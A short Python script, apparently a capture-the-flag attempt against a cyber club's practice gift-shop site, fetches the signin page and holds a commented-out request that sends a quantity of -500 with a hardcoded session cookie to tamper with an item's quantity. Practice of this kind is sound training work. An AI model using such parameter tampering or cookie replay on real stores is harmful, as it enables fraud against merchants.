import requests
item_id = "NATURALNUMBER"
URL1 = 'https://giftshop.pwn.osucyber.club/signin'
URL2 = 'https://giftshop.pwn.osucyber.club/update_quantity/'+item_id
PARAMS = {"quantity":-500}
COOKIES = {"connect.sid":"s:Jxj29FlRAG839PDuliOhnka8Rc46jbM0.EClS0YFM8/SPmj3d8mPgjQTa9aiU6+nKC2XUwfE5SKQ"}

r = requests.get(url=URL1)
text = r.text
cookies = r.cookies
print(text)
print(cookies.items())
# r = requests.post(url = URL2, params = PARAMS, cookies=COOKIES)
# text = r.text
# print(text)